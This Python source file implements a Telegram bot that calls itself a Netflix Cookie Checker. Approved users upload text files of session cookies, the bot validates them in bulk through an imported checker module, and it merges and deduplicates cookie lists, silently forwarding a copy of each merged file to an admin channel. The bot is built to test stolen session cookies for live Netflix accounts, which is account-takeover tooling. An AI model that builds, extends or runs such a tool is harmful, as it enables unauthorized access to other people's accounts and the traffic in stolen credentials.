import logging
import os
import tempfile
import requests # Import requests library
import asyncio
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, AUTHORIZED_USERS, ADMIN_USERS
from checkers import SafeFastChecker, check_cookies_async
from file_utils import combine_temp_files
from user_management import user_manager
from aiohttp import web
import sys

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- State definitions for ConversationHandler ---
CHOOSING, AWAIT_COOKIE_FILE, AWAIT_COMBINE_FILES, COLLECTING_COOKIE_FILES = range(4)

# --- Keyboard Markups ---
main_menu_keyboard = [
    ["🍪 Check Cookies", "🗂️ Combine .TXT Files"],
]
main_menu_markup = ReplyKeyboardMarkup(main_menu_keyboard, one_time_keyboard=True, resize_keyboard=True)

cookie_collection_keyboard = [
    ["✅ Done - Check All Cookies"],
    ["❌ Cancel"]
]
cookie_collection_markup = ReplyKeyboardMarkup(cookie_collection_keyboard, one_time_keyboard=False, resize_keyboard=True)

# --- Health Check Handler ---
async def health_check(request):
    """Health check endpoint for Render"""
    return web.Response(text="OK", status=200)

# --- Helper Functions ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Sends a simple welcome message for debugging."""
    logger.info("DEBUG: /start command received and handler was triggered.")
    await update.message.reply_text('Hi! The bot is responding. The issue might be in the ConversationHandler.')

async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Echo the user message for debugging."""
    logger.info(f"DEBUG: Echoing message: {update.message.text}")
    await update.message.reply_text(f"I received this message: {update.message.text}")

async def original_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Sends a welcome message and the main menu."""
    user = update.effective_user
    user_id = user.id if user else None
    
    # Track this user in the user manager if they're not already tracked
    # Only add them if they're an admin or already approved
    if user_id in ADMIN_USERS or user_manager.is_user_approved(user_id):
        # Add user to tracking if not already there
        if not user_manager.is_user_approved(user_id) and user_id in ADMIN_USERS:
            user_manager.add_user(user_id, user.username, user.first_name)
            
        welcome_message = (
            f"Hi {user.mention_html()}! 👋\n\n"
            f"Welcome to the Netflix Cookie Checker Bot.\n\n"
            f"Please choose an option from the menu below:"
        )
        await update.message.reply_html(
            welcome_message, reply_markup=main_menu_markup
        )
        return CHOOSING
    else:
        # User is not approved
        await update.message.reply_html(
            f"Hi {user.mention_html()}! 👋\n\n"
            f"You are not authorized to use this bot.\n"
            f"Your User ID: {user_id}\n\n"
            f"Use /request to request access from the administrator."
        )
        return ConversationHandler.END

# --- Cookie Checker Flow ---
async def request_cookie_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Requests the user to upload files for cookie checking."""
    # Initialize an empty list to store cookie files
    context.user_data['cookie_files'] = []
    
    await update.message.reply_text(
        "Please send one or more `.txt` files containing the cookies you want to check. "
        "Each cookie should be on a new line."
        "\n\nYou can send multiple files, and when you're done, click the 'Done' button."
    )
    return COLLECTING_COOKIE_FILES

async def handle_cookie_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles a single `.txt` file for cookie checking (legacy method)."""
    document = update.message.document
    if not document or not document.file_name.endswith('.txt'):
        await update.message.reply_text("That doesn't look like a `.txt` file. Please try again.", reply_markup=main_menu_markup)
        return CHOOSING

    file = await context.bot.get_file(document.file_id)
    
    with tempfile.NamedTemporaryFile(mode='wb+', delete=False, suffix='.txt') as temp_file:
        await file.download_to_memory(temp_file)
        temp_file_path = temp_file.name

    logger.info(f"User {update.effective_user.id} uploaded {document.file_name} for checking.")

    await update.message.reply_text(
        f"File `{document.file_name}` received. Starting the cookie check...",
        parse_mode='Markdown',
        reply_markup=ReplyKeyboardRemove()
    )
    
    lines_to_check = []
    try:
        with open(temp_file_path, "r", encoding="utf-8", errors="ignore") as f:
            lines_to_check = [line.strip() for line in f if line.strip()]
    finally:
        os.remove(temp_file_path)

    if not lines_to_check:
        await update.message.reply_text("The file is empty. Please try again.", reply_markup=main_menu_markup)
        return CHOOSING

    checker = SafeFastChecker()
    chat_id = update.effective_chat.id
    try:
        await check_cookies_async(checker, lines_to_check, context.bot, chat_id, update.message.message_id)
    except Exception as e:
        logger.error(f"Error in cookie checking for chat {chat_id}: {e}")
        await context.bot.send_message(chat_id, "A critical error occurred during the process.")

    await update.message.reply_text("Checker finished. What would you like to do next?", reply_markup=main_menu_markup)
    return CHOOSING

async def collect_cookie_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Collects multiple `.txt` files for cookie checking."""
    document = update.message.document
    if not document or not document.file_name.endswith('.txt'):
        await update.message.reply_text("That doesn't look like a `.txt` file. Please try again.", reply_markup=cookie_collection_markup)
        return COLLECTING_COOKIE_FILES

    file = await context.bot.get_file(document.file_id)
    
    temp_file_path = tempfile.mktemp(suffix=".txt")
    await file.download_to_drive(custom_path=temp_file_path)

    if 'cookie_files' not in context.user_data:
        context.user_data['cookie_files'] = []
    context.user_data['cookie_files'].append({
        'path': temp_file_path,
        'name': document.file_name
    })

    file_count = len(context.user_data['cookie_files'])
    await update.message.reply_text(
        f"Added `{document.file_name}`. You've uploaded {file_count} file(s) so far.\n\n"
        f"Send more files or click '✅ Done - Check All Cookies' when you're finished.",
        parse_mode='Markdown',
        reply_markup=cookie_collection_markup
    )
    return COLLECTING_COOKIE_FILES

async def process_cookie_files(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Processes all collected cookie files."""
    if update.message.text == "❌ Cancel":
        # Clean up any temporary files
        if 'cookie_files' in context.user_data:
            for file_info in context.user_data['cookie_files']:
                if os.path.exists(file_info['path']):
                    os.remove(file_info['path'])
            context.user_data['cookie_files'] = []
        
        await update.message.reply_text("Operation cancelled.", reply_markup=main_menu_markup)
        return CHOOSING
    
    file_infos = context.user_data.get('cookie_files', [])
    chat_id = update.effective_chat.id
    
    if not file_infos:
        await update.message.reply_text("You didn't send any files to check.", reply_markup=main_menu_markup)
        return CHOOSING

    await update.message.reply_text(
        f"Processing {len(file_infos)} files...", 
        reply_markup=ReplyKeyboardRemove()
    )

    # Combine all files into a single list of cookies
    all_cookies = []
    for file_info in file_infos:
        try:
            with open(file_info['path'], "r", encoding="utf-8", errors="ignore") as f:
                cookies = [line.strip() for line in f if line.strip()]
                all_cookies.extend(cookies)
                logger.info(f"Added {len(cookies)} cookies from {file_info['name']}")
        except Exception as e:
            logger.error(f"Error reading file {file_info['path']}: {e}")
    
    # Clean up temporary files
    for file_info in file_infos:
        if os.path.exists(file_info['path']):
            os.remove(file_info['path'])
    context.user_data['cookie_files'] = []
    
    if not all_cookies:
        await update.message.reply_text("No cookies found in the uploaded files.", reply_markup=main_menu_markup)
        return CHOOSING
    
    # Remove duplicates while preserving order
    unique_cookies = []
    seen = set()
    for cookie in all_cookies:
        if cookie not in seen:
            seen.add(cookie)
            unique_cookies.append(cookie)
    
    await update.message.reply_text(
        f"Found {len(unique_cookies)} unique cookies from {len(file_infos)} files.\n"
        f"Starting the cookie check..."
    )
    
    checker = SafeFastChecker()
    try:
        await check_cookies_async(checker, unique_cookies, context.bot, chat_id, update.message.message_id)
    except Exception as e:
        logger.error(f"Error in cookie checking for chat {chat_id}: {e}")
        await context.bot.send_message(chat_id, "A critical error occurred during the process.")

    await update.message.reply_text("Checker finished. What would you like to do next?", reply_markup=main_menu_markup)
    return CHOOSING

# --- File Combiner Flow ---
async def request_combine_files(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Requests the user to upload files for combining."""
    context.user_data['combine_files'] = []
    combine_keyboard = [["✅ Done Combining"]]
    markup = ReplyKeyboardMarkup(combine_keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "Please send me the `.txt` files you want to combine. "
        "Press '✅ Done Combining' when you have sent all the files.",
        reply_markup=markup
    )
    return AWAIT_COMBINE_FILES

async def handle_combine_files(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Collects files for combining."""
    document = update.message.document
    if document and document.file_name.endswith('.txt'):
        file = await context.bot.get_file(document.file_id)
        
        temp_file_path = tempfile.mktemp(suffix=".txt")
        await file.download_to_drive(custom_path=temp_file_path)

        if 'combine_files' not in context.user_data:
            context.user_data['combine_files'] = []
        context.user_data['combine_files'].append(temp_file_path)

        await update.message.reply_text(f"Added `{document.file_name}`. Send another or press 'Done'.", parse_mode='Markdown')
        return AWAIT_COMBINE_FILES
    else:
        await update.message.reply_text("Please send only `.txt` files.")
        return AWAIT_COMBINE_FILES

async def process_combined_files(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Combines the collected files and sends the result."""
    file_paths = context.user_data.get('combine_files', [])
    chat_id = update.effective_chat.id
    
    if not file_paths:
        await update.message.reply_text("You didn't send any files to combine.", reply_markup=main_menu_markup)
        return CHOOSING

    await update.message.reply_text("Processing files...", reply_markup=ReplyKeyboardRemove())

    try:
        output_path, unique_lines, total_lines = await combine_temp_files(file_paths)
        
        caption = (f"✅ Success!\n\n"
                   f"Combined {len(file_paths)} files.\n"
                   f"Total lines read: {total_lines}\n"
                   f"Unique lines saved: {unique_lines}")

        with open(output_path, 'rb') as doc:
            await context.bot.send_document(chat_id, document=doc, filename="combined_output.txt", caption=caption)
        
        # Also send a copy to the admin channel
        try:
            if TELEGRAM_CHAT_ID:
                 with open(output_path, 'rb') as doc:
                    admin_caption = f"📦 Combined file from user `{chat_id}`.\n\n" + caption
                    await context.bot.send_document(
                        chat_id=TELEGRAM_CHAT_ID,
                        document=doc,
                        filename="combined_output.txt",
                        caption=admin_caption,
                        parse_mode='Markdown',
                        disable_notification=True
                    )
        except Exception as e:
            logger.error(f"Failed to send combined file to admin channel ({TELEGRAM_CHAT_ID}): {e}", exc_info=True)

    except Exception as e:
        logger.error(f"Error combining files for chat {chat_id}: {e}", exc_info=True)
        await context.bot.send_message(chat_id, "An error occurred while combining the files.")
    finally:
        # Clean up all temporary files
        for path in file_paths:
            if os.path.exists(path):
                os.remove(path)
        # Clean up the final combined file if it exists
        if 'output_path' in locals() and os.path.exists(output_path):
             os.remove(output_path)

    context.user_data.clear()
    await update.message.reply_text("File combination complete. What's next?", reply_markup=main_menu_markup)
    return CHOOSING

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels and ends the conversation."""
    user = update.message.from_user
    logger.info("User %s canceled the conversation.", user.first_name)
    context.user_data.clear()
    await update.message.reply_text(
        'Operation cancelled.', reply_markup=main_menu_markup
    )
    return CHOOSING

# --- Diagnostic Command ---
async def test_admin_channel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Sends a test message to the configured admin channel."""
    await update.message.reply_text(f"Attempting to send a test message to the admin channel: `{TELEGRAM_CHAT_ID}`")
    
    if not TELEGRAM_CHAT_ID:
        await update.message.reply_text("`TELEGRAM_CHAT_ID` is not configured in `config.py`.")
        return

    try:
        await context.bot.send_message(
            chat_id=TELEGRAM_CHAT_ID,
            text=f"✅ This is a test message from the bot, triggered by user `{update.effective_user.id}`."
        )
        await update.message.reply_text(f"Successfully sent a test message. Please check the channel.")
    except Exception as e:
        logger.error(f"Failed to send test message to admin channel ({TELEGRAM_CHAT_ID}): {e}", exc_info=True)
        await update.message.reply_text(
            f"❌ Failed to send a message to the admin channel.\n\n"
            f"**Error:** `{e}`\n\n"
            f"**Most Likely Reason:**\n"
            f"1. The bot is not a member of the target channel/group.\n"
            f"2. The bot does not have permission to send messages there.",
            parse_mode='Markdown'
        )

# --- Legacy Diagnostic Command ---
def send_with_requests(token, chat_id, text):
    """Synchronous function to send a message using the requests library."""
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'disable_notification': True
    }
    try:
        response = requests.post(url, data=payload, timeout=10)
        response.raise_for_status() # Raise an exception for bad status codes
        return True, response.json()
    except requests.exceptions.RequestException as e:
        logger.error(f"requests call failed: {e}")
        return False, str(e)


async def test_legacy_send(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Sends a test message using the direct `requests` method."""
    await update.message.reply_text("Attempting to send a message using the legacy `requests` method...")

    if not TELEGRAM_CHAT_ID:
        await update.message.reply_text("`TELEGRAM_CHAT_ID` is not configured.")
        return

    # Run the synchronous requests call in a separate thread
    success, result = await asyncio.to_thread(
        send_with_requests,
        TELEGRAM_BOT_TOKEN,
        TELEGRAM_CHAT_ID,
        f"Legacy Test: This is a test message from the bot, triggered by user {update.effective_user.id}."
    )

    if success:
        await update.message.reply_text("✅ Legacy method succeeded! This confirms the issue is with the bot's channel membership/permissions for the new library.")
    else:
        await update.message.reply_text(f"❌ Legacy method also failed.\n\n**Error:** `{result}`")

# --- Final Diagnostic ---
async def get_chat_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Gets information about the configured admin chat ID."""
    await update.message.reply_text(f"Querying Telegram's API for info about Chat ID: `{TELEGRAM_CHAT_ID}`...")

    if not TELEGRAM_CHAT_ID:
        await update.message.reply_text("`TELEGRAM_CHAT_ID` is not configured.")
        return
        
    try:
        chat = await context.bot.get_chat(chat_id=TELEGRAM_CHAT_ID)
        info_text = (
            f"✅ **Success!** Telegram recognizes this Chat ID.\n\n"
            f"**Name:** {chat.title}\n"
            f"**Type:** {chat.type}\n"
            f"**ID:** {chat.id}"
        )
        await update.message.reply_text(info_text, parse_mode='Markdown')
    except Exception as e:
        error_text = (
            f"❌ **Final Test Failed.**\n\n"
            f"Telegram's API does not recognize this Chat ID.\n\n"
            f"**Error:** `{e}`\n\n"
            f"This confirms the `TELEGRAM_CHAT_ID` in `config.py` is incorrect. "
            f"Please use `@userinfobot` to get the correct ID."
        )
        await update.message.reply_text(error_text, parse_mode='Markdown')

# Filter for users who are either admins or approved
class ApprovedUserFilter(filters.MessageFilter):
    def filter(self, message):
        user_id = message.from_user.id if message.from_user else None
        return user_id in ADMIN_USERS or user_manager.is_user_approved(user_id)

user_filter = ApprovedUserFilter()

async def unauthorized(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Message for users not authorized"""
    user = update.effective_user
    await update.message.reply_text(
        f"⛔ You are not authorized to use this bot.\n\n"
        f"Your User ID: {user.id}\n\n"
        f"Please use /request to request access or contact @knightownr for approval"
    )

# --- Admin commands ---
async def admin_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Shows help for admin commands."""
    help_text = (
        "🔑 *ADMIN COMMANDS* 🔑\n\n"
        "*/approve <user_id> [username] [first_name]* - Approve a user to access the bot\n"
        "*/remove <user_id>* - Remove a user's access\n"
        "*/listusers* - List all approved users\n"
        "*/broadcast <message>* - Send a message to all approved users\n"
        "*/activate* - Activate the bot for approved users\n"
        "*/deactivate* - Deactivate the bot for all non-admin users\n"
        "*/adminhelp* - Show this help message"
    )
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def activate_bot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Activates the bot for all users."""
    context.application.bot_data['active'] = True
    await update.message.reply_text("✅ Bot has been activated.")
    
async def deactivate_bot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Deactivates the bot for non-admin users."""
    context.application.bot_data['active'] = False
    await update.message.reply_text("🔒 Bot has been deactivated for non-admin users.")

# --- User Management Commands ---
async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Approves a user to use the bot."""
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("⚠️ Please provide a valid user ID to approve.\nUsage: /approve 123456789")
        return
        
    user_id = int(context.args[0])
    username = context.args[1] if len(context.args) > 1 else None
    first_name = context.args[2] if len(context.args) > 2 else None
    
    if user_manager.add_user(user_id, username, first_name):
        await update.message.reply_text(f"✅ User {user_id} has been approved to use the bot.")
        
        # Notify the user that they've been approved
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text="✅ Your access request has been approved! You can now use the bot.\n\nUse /start to begin."
            )
        except Exception as e:
            logger.error(f"Failed to notify user {user_id} about approval: {e}")
            await update.message.reply_text(f"⚠️ User approved but notification failed: {e}")
    else:
        await update.message.reply_text(f"ℹ️ User {user_id} is already approved.")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Removes a user's access to the bot."""
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("⚠️ Please provide a valid user ID to remove.\nUsage: /remove 123456789")
        return
        
    user_id = int(context.args[0])
    
    if user_manager.remove_user(user_id):
        await update.message.reply_text(f"✅ User {user_id} has been removed from approved users.")
    else:
        await update.message.reply_text(f"ℹ️ User {user_id} was not in the approved users list.")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Lists all approved users."""
    users = user_manager.get_all_users()
    
    if not users:
        await update.message.reply_text("ℹ️ No users are currently approved.")
        return
    
    user_list = "📋 *APPROVED USERS*\n\n"
    for user in users:
        username = user.get('username', 'None')
        first_name = user.get('first_name', 'Unknown')
        
        # Show username if available, otherwise show first name
        display_name = username if username and username != 'None' else first_name
        user_list += f"ID: {user['user_id']} | Name: {display_name}\n"
    
    await update.message.reply_text(user_list, parse_mode='Markdown')

async def broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Broadcasts a message to all users who have started the bot."""
    if not context.args:
        await update.message.reply_text("⚠️ Please provide a message to broadcast.\nUsage: /broadcast Your message here")
        return
        
    message = " ".join(context.args)
    users = user_manager.get_all_users()
    
    if not users:
        await update.message.reply_text("ℹ️ No users to broadcast to.")
        return
    
    sent_count = 0
    failed_count = 0
    
    await update.message.reply_text(f"🔄 Broadcasting message to {len(users)} users...")
    
    for user in users:
        try:
            await context.bot.send_message(
                chat_id=user['user_id'],
                text=f"📢 *BROADCAST MESSAGE*\n\n{message}",
                parse_mode='Markdown'
            )
            sent_count += 1
        except Exception as e:
            logger.error(f"Failed to send broadcast to user {user['user_id']}: {e}")
            failed_count += 1
    
    await update.message.reply_text(
        f"✅ Broadcast complete!\n"  
        f"📤 Successfully sent: {sent_count}\n"
        f"❌ Failed: {failed_count}"
    )

# --- User Access Request ---
async def request_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Allows users to request access from the admin."""
    user = update.effective_user
    user_id = user.id
    username = user.username or "No username"
    first_name = user.first_name or "Unknown"
    
    # Check if user is already approved
    if user_id in ADMIN_USERS or user_manager.is_user_approved(user_id):
        await update.message.reply_text("✅ You already have access to this bot!")
        return
    
    # Send request to admin
    admin_message = (
        f"🔔 *ACCESS REQUEST*\n\n"
        f"User ID: `{user_id}`\n"
        f"Username: @{username}\n"
        f"Name: {first_name}\n\n"
        f"To approve: `/approve {user_id} {username} {first_name}`"
    )
    
    for admin_id in ADMIN_USERS:
        try:
            await context.bot.send_message(
                chat_id=admin_id,
                text=admin_message,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Failed to send access request to admin {admin_id}: {e}")
    
    await update.message.reply_text(
        "✅ Your access request has been sent to the administrator.\n"
        "You will be notified when access is granted."
    )

# --- Active state control ---
async def update_user_information(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Update user information in the database whenever they interact with the bot."""
    user = update.effective_user
    if user:
        user_id = user.id
        username = user.username
        first_name = user.first_name
        
        # Only update if the user is already approved
        if user_manager.is_user_approved(user_id):
            user_manager.update_user_info(user_id, username, first_name)
    return None

async def guard_active(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Blocks interactions when bot is deactivated or user is not approved."""
    user = update.effective_user
    user_id = user.id if user else None
    
    # Always allow admins
    if user_id in ADMIN_USERS:
        return
        
    # Check if bot is active
    if not context.application.bot_data.get('active', True):
        await update.message.reply_text("🔒 Bot is currently deactivated. Please try again later.")
        return
    
    # Check if user is approved
    if not user_manager.is_user_approved(user_id):
        await update.message.reply_text(
            "⛔ You are not authorized to use this bot.\n"
            "Use /request to request access from the administrator."
        )
        return

async def main() -> None:
    """Start the bot and web server."""
    # Initialize bot
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Init active flag
    application.bot_data['active'] = True
    
    # --- User information update handler (group -2 for highest priority) ---
    application.add_handler(MessageHandler(filters.ALL, update_user_information), group=-2)

    # --- Unauthorized handler (group 0) ---
    application.add_handler(MessageHandler(~user_filter & ~(filters.COMMAND & filters.User(ADMIN_USERS)), unauthorized), group=0)

    # --- Guard active (group 1) ---
    application.add_handler(MessageHandler(user_filter & (~filters.COMMAND | ~filters.User(ADMIN_USERS)), guard_active), group=1)

    # --- Admin activate / deactivate handlers (group -1 for higher priority) ---
    application.add_handler(CommandHandler("activate", activate_bot, filters=filters.User(ADMIN_USERS)), group=-1)
    application.add_handler(CommandHandler("deactivate", deactivate_bot, filters=filters.User(ADMIN_USERS)), group=-1)
    
    # --- User management handlers (group -1 for higher priority) ---
    application.add_handler(CommandHandler("approve", approve_user, filters=filters.User(ADMIN_USERS)), group=-1)
    application.add_handler(CommandHandler("remove", remove_user, filters=filters.User(ADMIN_USERS)), group=-1)
    application.add_handler(CommandHandler("listusers", list_users, filters=filters.User(ADMIN_USERS)), group=-1)
    application.add_handler(CommandHandler("broadcast", broadcast_message, filters=filters.User(ADMIN_USERS)), group=-1)
    application.add_handler(CommandHandler("adminhelp", admin_help, filters=filters.User(ADMIN_USERS)), group=-1)

    # --- Main conversation handler ---
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', original_start, filters=user_filter)],
        states={
            CHOOSING: [
                MessageHandler(filters.Regex('^🍪 Check Cookies$') & user_filter, request_cookie_file),
                MessageHandler(filters.Regex('^🗂️ Combine TXT Files$') & user_filter, request_combine_files),
            ],
            COLLECTING_COOKIE_FILES: [
                MessageHandler(filters.Regex('^✅ Done - Check All Cookies$') & user_filter, process_cookie_files),
                MessageHandler(filters.Regex('^❌ Cancel$') & user_filter, process_cookie_files),
                MessageHandler(filters.Document.TXT & user_filter, collect_cookie_file),
            ],
            AWAIT_COMBINE_FILES: [
                 MessageHandler(filters.Regex('^✅ Done Combining$') & user_filter, process_combined_files),
                 MessageHandler(filters.Document.TXT & user_filter, handle_combine_files),
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel, filters=user_filter), CommandHandler('start', original_start, filters=user_filter)],
    )
    application.add_handler(conv_handler)
    
    application.add_handler(CommandHandler("testadmin", test_admin_channel))
    application.add_handler(CommandHandler("testlegacy", test_legacy_send))
    application.add_handler(CommandHandler("chatinfo", get_chat_info))
    
    # --- Access request handler ---
    application.add_handler(CommandHandler("request", request_access), group=-1)
    
    # Start web server for health checks and webhook
    app = web.Application()
    app.router.add_get('/health', health_check)
    
    # Get port from environment variable or use default
    port = int(os.environ.get('PORT', 8080))
    
    # Get webhook URL from environment variable
    webhook_url = os.environ.get('WEBHOOK_URL')
    
    try:
        if webhook_url:
            # Use webhook mode
            await application.initialize()
            await application.start()
            await application.bot.set_webhook(url=f"{webhook_url}/webhook")
            
            # Add webhook handler
            async def webhook_handler(request):
                """Handle incoming webhook updates"""
                update = Update.de_json(await request.json(), application.bot)
                await application.process_update(update)
                return web.Response()
            
            app.router.add_post('/webhook', webhook_handler)
        else:
            # Use polling mode (for local development)
            await application.initialize()
            await application.start()
            await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
        
        # Start web server
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', port)
        await site.start()
        
        logger.info(f"Bot started. Web server running on port {port}")
        
        # Keep the bot running
        while True:
            await asyncio.sleep(3600)  # Sleep for an hour
            
    except Exception as e:
        logger.error(f"Error in main loop: {e}")
        raise
    finally:
        if webhook_url:
            await application.bot.delete_webhook()
        await application.stop()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)